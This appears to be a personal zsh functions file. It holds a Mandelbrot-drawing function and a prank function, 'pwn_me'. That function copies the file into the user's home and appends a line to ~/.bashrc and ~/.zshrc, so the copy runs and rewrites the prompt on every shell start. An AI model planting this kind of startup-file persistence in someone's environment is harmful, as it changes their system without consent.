#!/usr/bin/env zsh
# ZSH Functions
function most_useless_use_of_zsh {
   local lines columns colour a b p q i pnew
   ((columns=COLUMNS-1, lines=LINES-1, colour=0))
   for ((b=-1.5; b<=1.5; b+=3.0/lines)) do
       for ((a=-2.0; a<=1; a+=3.0/columns)) do
           for ((p=0.0, q=0.0, i=0; p*p+q*q < 4 && i < 32; i++)) do
               ((pnew=p*p-q*q+a, q=2*p*q+b, p=pnew))
           done
           ((colour=(i/4)%8))
            echo -n "\\e[4${colour}m "
        done
        echo
    done
    echo -n "\e[49m"
}

function pwn_me {
    FUNCTION_LOC="/home/just.jake/.zsh/functions.zsh"
    PWN_LOC="$HOME/why-you-should-use.zsh"
    [[ ! -a "$PWN_LOC" ]] && cat "$FUNCTION_LOC" > "$PWN_LOC"
    # assemble some string here or something
    the_pwn="\n[[ -a \"$PWN_LOC\" ]] && which zsh >/dev/null && export PWN_ME=PLZ && zsh \"$PWN_LOC\""
    for rc in $HOME/.bashrc $HOME/.zshrc
    do
         echo "$the_pwn"  >> $rc
    done
}

function this_script_dir {
    echo "$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
}

# derp
if [[ $PWN_ME = PLZ ]]; then
    most_useless_use_of_zsh
    echo "ZOMG ZSH ZO GOOD!"
    echo "to remove this, find the line at the end of your .bashrc or .zshrc and remove it"
    sleep 2
    export PS1="`cat ~just.jake/.irssi/ascii/kbeckman`[9A[14C"
    export RPS1=""
fi
